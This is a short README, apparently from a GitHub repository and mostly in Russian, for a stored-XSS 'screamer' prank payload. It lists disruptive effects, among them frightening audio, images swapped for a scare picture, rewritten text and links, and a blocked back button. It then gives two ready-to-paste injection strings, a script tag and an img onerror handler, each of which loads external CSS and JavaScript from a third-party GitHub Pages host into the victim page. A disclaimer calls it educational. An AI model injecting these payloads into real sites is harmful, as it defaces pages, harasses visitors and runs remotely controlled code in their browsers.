# XSS

Код сработает только при наличии уязвимости хранимый XSS + если сайт не будет блокировать загрузку внешних скриптов и стилей. <br>

* Страшная музыка.
* Постепенно изменяющийся цвет фона на красный.
* Прыгающий и мигающий текст.
* Нельзя вернуться на предыдущую страницу (зависит от браузера).
* Замена всех изображений на скример.
* Замена текста в тегах "p", "h1", "a".
* Замена всех тегов "a" на "p".
* Скример на весь экран с криком в течение какого-то времени.

⚠️ Important: This payload is for educational purposes only and for testing on your own or training systems. Use in real attacks violates laws and ethical standards. The author of the repository is not responsible for the use of this payload by third parties.

------------------------------------------

Полная версия (JS + CSS):
<br><br>Через тег "script" [288 символов]:
<br>```<script>var c=document.createElement('link');c.rel='stylesheet';c.href='//scullteam.github.io/XSS/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//scullteam.github.io/XSS/script.js';document.body.appendChild(r);</script>```
<br><br>Через тег "img" [300 символов]:
<br>```<img src="" alt="" onerror="var c=document.createElement('link');c.rel='stylesheet';c.href='//scullteam.github.io/XSS/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//scullteam.github.io/XSS/script.js';document.body.appendChild(r)">```
